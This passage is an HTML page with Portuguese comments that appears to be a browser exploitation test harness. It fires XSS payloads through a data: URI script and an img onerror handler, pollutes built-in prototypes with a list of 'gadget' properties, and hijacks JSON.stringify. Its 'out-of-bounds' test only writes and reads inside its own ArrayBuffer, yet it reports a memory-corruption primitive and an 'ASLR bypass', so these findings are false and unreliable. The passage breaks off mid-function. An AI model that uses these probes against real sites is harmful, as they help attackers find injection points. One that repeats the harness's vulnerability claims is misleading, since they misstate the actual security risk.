<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Focused Tests (v14 Detailed Logs/Escalation Highlights)</title> <style>
        /* Estilos CSS (Idênticos aos anteriores, mas adicionando um estilo para destaque) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output, #output-canvas { background: #222; border: 1px solid #444; padding: 10px; height: 50vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; } /* Novo estilo */
        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 60px; overflow-y: auto; }
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; cursor: default; }
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>(PP Hijack JSON) - Script 1 (v14 Logs Detalhados)</h1> <p>Testa: XSS Básico, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify).</p>
    <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS (Script 1 v14)</button> <div id="output"></div>
    <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>

    <hr>

    <section>
        <h2>Teste de Canvas Focado (v14 Detailed Logs/Escalation Highlights) - Script 2</h2> <p>Foco: PP Avançado++, OOB Read++, OOB Write->Metadata, WebGL, Quadrados.</p>
        <canvas id="interactive-canvas" width="350" height="250"></canvas>
        <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v14 (Script 2)</button> <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 1 Original (v14 - Logs Detalhados) ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 500;
        let leakedValueFromOOB = null;

        const log = (message, type = 'info', funcName = '') => {
            if (!outputDiv) return;
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                // Sanitização simples para evitar auto-XSS no log
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                // Adiciona classe especial para logs de escalação
                 const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';

                if(outputDiv.innerHTML.length > 500000){
                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
                    outputDiv.innerHTML = `<span>[Log S1 Truncado...]</span>\n` + outputDiv.innerHTML;
                }
                 outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch(e) {
                console.error("Erro log S1:", e);
                // Evitar loop infinito se o próprio log falhar
                if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
            }
        };

        const toHex = (val, bits = 32) => {
            //...(sem alterações)...
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        };

        const isPotentialPointer64 = (high, low) => {
             //...(sem alterações)...
             if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true;
        };

        const isPotentialData32 = (val) => {
            //...(sem alterações)...
            if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true;
        };

        const testCSPBypass = async () => {
            const FNAME = 'testCSPBypass';
            log("--- Iniciando Teste 1: XSS Básico (Script 1) ---", 'test', FNAME);
            log("Tentando XSS via data: URI...", 'subtest', FNAME);
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const payloadJS = `try { alert('XSS S1 via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln", "XSS Payload"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good", "XSS Payload"); }`;
                const encodedPayload = btoa(payloadJS);
                const scriptTag = document.createElement('script');
                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                log(`Payload: data:text/javascript;base64,${encodedPayload.substring(0,30)}...`, 'info', FNAME);
                scriptTag.onerror = (e) => {
                    log(`ERRO: Falha carregar script data: URI! Event: ${e.type}`, 'error', FNAME);
                };
                document.body.appendChild(scriptTag);
                log("Tag <script> data: URI adicionada ao DOM.", 'info', FNAME);
            } catch (e) {
                log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error', FNAME);
            }
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2));

            log("Tentando XSS DOM via onerror...", 'subtest', FNAME);
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const imgTag = document.createElement('img');
                 const imgSrc = 'invalid_img_' + Date.now();
                 imgTag.src = imgSrc;
                 const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML += '<br><span class="log-vuln">XSS S1 DOM via ONERROR Executado!</span>'; log("XSS DOM via onerror OK!", "vuln", "ONERROR Payload"); } else { log("Alvo XSS DOM não encontrado.", "error", "ONERROR Payload"); } alert('XSS_S1_DOM_ONERROR'); } catch(e) { log("Erro payload onerror: " + e.message, "warn", "ONERROR Payload"); } `;
                log(`Payload onerror: ${onerrorPayload.substring(0, 50)}...`, 'info', FNAME);
                imgTag.setAttribute('onerror', onerrorPayload);
                log(`Adicionando tag <img src="${imgSrc}" onerror="..."> ao DOM.`, 'info', FNAME);
                document.body.appendChild(imgTag);
            } catch (e) {
                log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME);
            }
            log("--- Teste 1 Concluído ---", 'test', FNAME);
        };

        const testOOBReadInfoLeakEnhancedStore = async () => {
            const FNAME = 'testOOBReadInfoLeakEnhancedStore';
            log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME);
            const bufferSize = 32; // Tamanho intencional do buffer
            const writeValue = 0xEE; // Valor a ser escrito OOB
            const oobWriteOffset = bufferSize; // Escrever exatamente após o fim do buffer intencional
            const readRangeStart = -64; // Onde começar a ler relativo ao início do buffer intencional
            const readRangeEnd = bufferSize + 64; // Onde parar de ler
            const allocationSize = bufferSize + 256; // Alocar mais para ter espaço para OOB
            const baseOffsetInBuffer = 128; // Onde o buffer "intencional" começa dentro da alocação maior

            const oobReadOffsets = [];
            for (let i = readRangeStart; i < readRangeEnd; i += 4) { // Ler de 4 em 4 bytes (U32)
                oobReadOffsets.push(i);
            }

            let writeSuccess = false;
            let potentialLeakFoundCount = 0;
            leakedValueFromOOB = null; // Resetar leak anterior

            log(`Config: bufferSize=${bufferSize}, oobWriteOffset=${oobWriteOffset}, allocationSize=${allocationSize}, baseOffsetInBuffer=${baseOffsetInBuffer}`, 'info', FNAME);

            try {
                const buffer = new ArrayBuffer(allocationSize);
                const dataView = new DataView(buffer);
                log(`ArrayBuffer de ${buffer.byteLength} bytes alocado.`, 'info', FNAME);

                // Preencher buffer com padrão para visualização
                for (let i = 0; i < buffer.byteLength; i++) {
                    dataView.setUint8(i, 0xAA);
                }
                log(`Buffer preenchido com 0xAA.`, 'info', FNAME);

                // Calcular endereço absoluto dentro do ArrayBuffer alocado
                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                log(`Tentando escrita OOB U8 @ offset ${oobWriteOffset} (endereço absoluto ${writeTargetAddress})...`, 'subtest', FNAME);
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));

                try {
                    dataView.setUint8(writeTargetAddress, writeValue);
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                    log(`---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write Simples) ***`, 'escalation', FNAME);
                    writeSuccess = true;
                } catch (e) {
                    log(`BLOQ: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}): ${e.message}`, 'good', FNAME);
                    log(`--- Teste 2 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME);
                    return false; // Não continuar se a escrita falhar
                }

                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                log(`Tentando leituras OOB U32/U64 de ${readRangeStart} a ${readRangeEnd} (relativo a ${baseOffsetInBuffer})...`, 'subtest', FNAME);

                for (const readOffset of oobReadOffsets) {
                    const readTargetAddress = baseOffsetInBuffer + readOffset;
                    const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;

                    // Verificar se a leitura U64 é válida (dentro dos limites da *alocação maior*)
                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
                        try {
                            const low = dataView.getUint32(readTargetAddress, true); // Little-endian
                            const high = dataView.getUint32(readTargetAddress + 4, true); // Little-endian

                            if (isPotentialPointer64(high, low)) {
                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
                                potentialLeakFoundCount++;
                                if (leakedValueFromOOB === null) {
                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset };
                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                    log(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME);
                                }
                             } else if (low !== 0xAAAAAAAA && high !== 0xAAAAAAAA && (low !== 0 || high !== 0)) {
                                 // Logar outros valores não-padrão que não parecem ponteiros 0
                                 // log(` -> Data? U64 ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'info', FNAME);
                             }
                        } catch (e) {
                             // Erros de leitura U64 são esperados se o offset estiver muito fora
                             // log(`Erro leitura U64 ${relOffsetStr}: ${e.message}`, 'warn', FNAME);
                        }
                    }

                    // Verificar se a leitura U32 é válida (se U64 não vazou nada ainda)
                     if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
                        try {
                            const val32 = dataView.getUint32(readTargetAddress, true); // Little-endian

                            if (isPotentialData32(val32)) {
                                log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
                                potentialLeakFoundCount++;
                                leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset };
                                log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                // U32 leak pode ser útil, mas ponteiros U64 são geralmente mais valiosos para ASLR bypass
                                log(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME); // Menor severidade no destaque
                            }

                            // Verificar se lemos o valor que escrevemos OOB
                            if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) {
                                log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME);
                            }
                        } catch (e) {
                             // Erros de leitura U32 são esperados
                             // log(`Erro leitura U32 ${relOffsetStr}: ${e.message}`, 'warn', FNAME);
                        }
                    }

                    if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1)); // Pequena pausa para não travar
                }

            } catch (e) {
                log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                const leakStatus = leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset}` : 'nenhum valor armazenado';
                log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME);
            }
            return writeSuccess;
        };

        const testBasicPP = async () => {
            const FNAME = 'testBasicPP';
            log("--- Iniciando Teste 3: PP (Básica) ---", 'test', FNAME);
            const prop = '__pp_basic__';
            const val = 'Polluted!';
            let ok = false;
            let testObj = null;
            try {
                log(`Poluindo Object.prototype.${prop} = "${val}"`, 'subtest', FNAME);
                Object.prototype[prop] = val;

                log("Verificando herança em novo objeto {}...", 'subtest', FNAME);
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                testObj = {}; // Criar objeto *após* poluir
                const inheritedValue = testObj[prop];
                log(`Valor herdado em {}: ${inheritedValue} (Tipo: ${typeof inheritedValue})`, 'info', FNAME);

                if (inheritedValue === val) {
                    log(`VULN: PP Básica OK! Objeto herdou a propriedade poluída.`, 'vuln', FNAME);
                    ok = true;
                } else {
                    log(`FALHA: PP Básica não OK. Objeto não herdou a propriedade.`, 'good', FNAME);
                }
            } catch (e) {
                log(`Erro durante teste PP Básico: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                try {
                    log(`Tentando limpar Object.prototype.${prop}...`, 'info', FNAME);
                    delete Object.prototype[prop];
                    if (testObj && testObj[prop] === undefined) {
                         log(`Limpeza Object.prototype.${prop} OK. Propriedade removida do objeto teste.`, 'info', FNAME);
                    } else if (testObj && testObj[prop] !== undefined) {
                         log(`AVISO: Limpeza Object.prototype.${prop} falhou? Objeto teste ainda tem a propriedade.`, 'warn', FNAME);
                    } else {
                         log(`Limpeza Object.prototype.${prop} executada (verificação não aplicável).`, 'info', FNAME);
                    }
                } catch(e){
                     log(`Erro ao limpar Object.prototype.${prop}: ${e.message}`, 'error', FNAME);
                }
            }
            log(`--- Teste 3 Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test', FNAME);
            return ok;
        };

        const testPPJsonHijack = async () => {
            const FNAME = 'testPPJsonHijack';
            log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test', FNAME);
            const orig = JSON.stringify;
            let okH = false; // Hijack ocorreu?
            let okL = false; // Leitura do leak OOB ocorreu?
            let okR = false; // Retorno da função hijack foi correto?

            try {
                log("Tentando sobrescrever JSON.stringify globalmente...", 'subtest', FNAME);

                JSON.stringify = function hijacked(v, r, s) {
                    log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME);
                    okH = true; // Marcar que o hijack ocorreu

                    log(` -> Tentando ler leak do Teste 2 (leakedValueFromOOB)...`, 'info', FNAME);
                    try {
                        const l = leakedValueFromOOB; // Acessar a variável global
                        let lStr = "NULO ou Indefinido";
                        if (l) {
                            lStr = l.type === 'U64'
                                ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}`
                                : `U32 ${toHex(l.low)} @${l.offset}`;
                            okL = true; // Marcar que a leitura foi bem-sucedida (não nulo)
                            log(` ---> INFO: Interação entre Hijack e OOB Read Leak BEM-SUCEDIDA.`, 'escalation', FNAME); // Potencialmente útil
                        } else {
                            log(` -> Valor OOB não encontrado ou nulo.`, 'warn', FNAME);
                        }
                        log(` -> Valor OOB lido: ${lStr}`, okL ? 'leak' : 'warn', FNAME);
                    } catch(ie) {
                        log(` -> Erro ao tentar ler leak OOB: ${ie.message}`, 'error', FNAME);
                        console.error(ie);
                    }
                    // Retornar um valor diferente do original para confirmar o hijack
                    const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}';
                     log(` -> Retornando valor modificado: ${hijackReturnValue}`, 'info', FNAME);
                    return hijackReturnValue;
                };

                log("JSON.stringify sobrescrito. Testando chamada...", 'subtest', FNAME);
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                const testObject = {a:1, b: 'test'};
                log(`Objeto a ser serializado: ${orig(testObject)} (usando original para log)`, 'info', FNAME); // Log usando o original salvo
                const result = JSON.stringify(testObject); // Chamar a versão potencialmente sequestrada
                log(`Resultado da chamada a JSON.stringify: ${result}`, 'info', FNAME);

                if (result && result.includes('"hijacked": true')) {
                    log("VULN: Retorno da função JSON.stringify sequestrada verificado com sucesso!", 'vuln', FNAME);
                    okR = true;
                } else if (okH) {
                    log("AVISO: Hijack ocorreu (função executou), mas retorno não foi o esperado.", 'warn', FNAME);
                } else {
                    log("FALHA: Hijack de JSON.stringify falhou ou não foi detectado.", 'good', FNAME);
                }
            } catch (e) {
                log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME);
                console.error(e);
            } finally {
                log("Restaurando JSON.stringify original...", 'info', FNAME);
                JSON.stringify = orig; // Restaurar a função original
                // Verificação extra
                if (JSON.stringify === orig) {
                     log("JSON.stringify restaurado com sucesso.", 'info', FNAME);
                } else {
                    log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME);
                     // Isso pode quebrar outras partes da página/navegador
                }
            }
            log(`--- Teste 4 Concluído (Hijack ${okH ? 'Detectado' : 'Não Detectado'}, Retorno ${okR ? 'OK' : 'Falhou'}, Leitura Leak OOB ${okL ? 'OK' : 'Falhou/Nulo'}) ---`, 'test', FNAME);
            return okR && okL; // Considerar sucesso se o hijack ocorreu E leu o leak
        };

        const runAllTests = async () => {
             const FNAME = 'runAllTests';
            if (runBtn) runBtn.disabled = true;
            log("==== INICIANDO Script 1 (v14 Logs Detalhados) ====", 'test', FNAME);

            await testCSPBypass();
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            await testOOBReadInfoLeakEnhancedStore();
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            await testBasicPP();
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            await testPPJsonHijack();
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            log("\n==== Script 1 CONCLUÍDO ====", 'test', FNAME);
            if (runBtn) runBtn.disabled = false;
        };

    </script>

    <script>
        // --- Script 2: Canvas Exploração Focada (v14 Logs Detalhados) ---

        // --- Variáveis Globais do Script 2 ---
        const SHORT_PAUSE_CANVAS = 50;
        let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
        const interactiveAreas = [ { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' }, { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' }, { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' } ];
        const imgSquareSize = 20; const imgSquareSpacing = 5; const imgSquares = []; const imgSquaresStartY = 205;
        let currentLeakData = { text: "Leak(S1): N/A", color: "#AAAAAA" };
        let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;

        // --- Funções Helper ---
        const logCanvas = (message, type = 'info', funcName = '') => {
            if (!outputDivCanvas) return;
            const logPrefix = `[CANVAS-${type.toUpperCase()}]`;
            const funcPrefix = funcName ? `[${funcName}] ` : '';
            const logMsg = `${logPrefix} ${funcPrefix}${message}`;
            console.log(logMsg); // Logar também no console para fácil cópia/depuração
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; // Inclui 'escalation'

                if(outputDivCanvas.innerHTML.length > 750000){
                    outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 350000);
                    outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML;
                }
                outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${funcPrefix}${sM}\n</span>`;
                outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight;
            } catch(e) {
                console.error("logCanvas ERRO:", e);
                 if (outputDivCanvas) outputDivCanvas.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
            }
        };
        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
        const toHexCanvas = (val, bits = 32) => {
             //...(sem alterações)...
             if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0');
        };
        const isPotentialPointer64_S2 = (high, low) => {
             //...(sem alterações)...
            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; /* Add more specific checks if needed, e.g., alignment for target platform */ return true;
        };
        const isPotentialData32_S2 = (val) => {
            //...(sem alterações)...
            if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true;
        };
        const drawInteractiveAreas = () => {
             //...(sem alterações)...
            if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error', 'drawInteractiveAreas'); }
        };
        const drawImageSquares = () => {
             //...(sem alterações)...
            if (!ctx) return; try { imgSquares.forEach(sq => { ctx.fillStyle = sq.hover ? 'yellow' : sq.color; ctx.fillRect(sq.x, sq.y, sq.size, sq.size); ctx.strokeStyle = '#888'; ctx.strokeRect(sq.x, sq.y, sq.size, sq.size); }); } catch(e) { logCanvas(`Erro drawSquares: ${e.message}`, 'error', 'drawImageSquares'); }
        };
        const redrawAll = () => {
             //...(sem alterações)...
            if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error', 'redrawAll'); }
        };

        // ===========================================================
        // === DEFINIÇÕES DAS FUNÇÕES DE TESTE FOCADAS (Script 2) ===
        // ===========================================================

        const testWebGLCheck = async () => {
             const FNAME = 'testWebGLCheck';
            logCanvas("--- Teste: Verificação WebGL ---",'test', FNAME);
            glContext=null; isWebGL2=false;
            try {
                logCanvas("Tentando obter contexto 'webgl' ou 'experimental-webgl'...", 'info', FNAME);
                glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl');
                if(glContext){
                    const glVersion = glContext.getParameter(glContext.VERSION);
                    const glRenderer = glContext.getParameter(glContext.RENDERER);
                    logCanvas(`WebGL OK! V:${glVersion}`, 'vuln', FNAME);
                    logCanvas(`Renderer: ${glRenderer}`, 'info', FNAME);
                    try{
                         logCanvas("Tentando obter contexto 'webgl2'...", 'info', FNAME);
                         let gl2=canvasElement.getContext('webgl2');
                         if(gl2){
                             const gl2Version = gl2.getParameter(gl2.VERSION);
                             const gl2Renderer = gl2.getParameter(gl2.RENDERER);
                            logCanvas(`WebGL2 OK! V:${gl2Version}`, 'vuln', FNAME);
                             logCanvas(`Renderer 2: ${gl2Renderer}`, 'info', FNAME);
                            isWebGL2=true;
                            // Poderíamos potencialmente usar o gl2 context, mas manteremos o gl1 por enquanto
                            // glContext = gl2; // Descomentar se quisermos usar gl2 preferencialmente
                         } else {
                            logCanvas("WebGL2 não disponível.", 'good', FNAME);
                         }
                     }catch(e2){
                        logCanvas(`Erro ao verificar WebGL2: ${e2.message}`, 'warn', FNAME);
                     }
                }else{
                    logCanvas('WebGL N/A.', 'good', FNAME);
                }
             }catch(e){
                logCanvas(`Erro ao verificar WebGL: ${e.message}`, 'error', FNAME);
                console.error(e);
                glContext=null;
             }
            logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}) ---`, 'test', FNAME);
            await PAUSE();
        };

        const testAdvancedPP = async () => {
            const FNAME = 'testAdvancedPP';
            logCanvas("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME);
            const propsToPollute = [
                { name: 'constructor', proto: Object.prototype, protoName: 'Object' },
                { name: '__proto__', proto: Object.prototype, protoName: 'Object' },
                { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null },
                { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, // Menos comum, mas testando
                { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')},
                { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, // Espera-se que falhe
                { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') },
                { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, // style é um objeto CSSStyleDeclaration
                { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') },
                { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') },
                { name: 'valueOf', proto: Object.prototype, protoName: 'Object' },
                { name: 'toString', proto: Object.prototype, protoName: 'Object' },
                { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] },
                { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} },
                { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }
            ];
            const testValue = "PP_Adv_Polluted_" + Date.now(); // Valor único para cada execução
            let successCount = 0;
            let gadgetCount = 0;

            for (const item of propsToPollute) {
                 const prop = item.name;
                 const targetProto = item.proto;
                 const targetProtoName = item.protoName;
                 logCanvas(`Testando ${targetProtoName}.prototype.${prop}...`, 'subtest', FNAME);

                 let inherited = false;
                 let gadgetMsg = null;
                 let errorMsg = null;
                 let originalValue = undefined;
                 let wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); //hasOwnProperty não funciona em protótipos DOM como Element.prototype

                 try {
                     // Salvar valor original se existir (melhor esforço)
                     if (wasDefined) {
                        originalValue = targetProto[prop];
                        logCanvas(` -> Propriedade '${prop}' já existe no protótipo ${targetProtoName}. Valor original: ${originalValue}`, 'info', FNAME);
                     }

                     logCanvas(`  Poluindo ${targetProtoName}.prototype.${prop} = "${testValue}"`, 'info', FNAME);
                     targetProto[prop] = testValue;

                     // Criar objeto de teste específico ou genérico
                     let obj;
                     if (item.createTarget) {
                         obj = item.createTarget();
                         logCanvas(`  Verificando herança em novo ${obj.constructor.name}...`, 'info', FNAME);
                     } else {
                          obj = {}; // Padrão para Object.prototype
                         logCanvas(`  Verificando herança em novo {}...`, 'info', FNAME);
                     }

                     const inheritedValue = obj[prop];
                     logCanvas(`  Valor herdado: ${typeof inheritedValue === 'string' ? '"'+inheritedValue+'"' : inheritedValue}`, 'info', FNAME);

                     // Verificar herança
                     // Cuidado: A comparação pode falhar se a propriedade for um getter/setter complexo ou objeto
                     if (inheritedValue === testValue) {
                         logCanvas(`-> VULN: Herança de '${prop}' OK.`, 'vuln', FNAME);
                         inherited = true;
                         successCount++;
                         // Verificar Gadget se a herança funcionou
                         if (item.gadgetCheck) {
                             gadgetMsg = item.gadgetCheck(obj, testValue);
                             if (gadgetMsg) {
                                 logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME);
                                 gadgetCount++;
                                 // Destacar gadgets que afetam DOM ou funções críticas
                                 if (['href', 'src', 'onclick', 'onerror', 'map', 'call', 'apply'].includes(prop)) {
                                     logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME);
                                 }
                             }
                         }
                     } else {
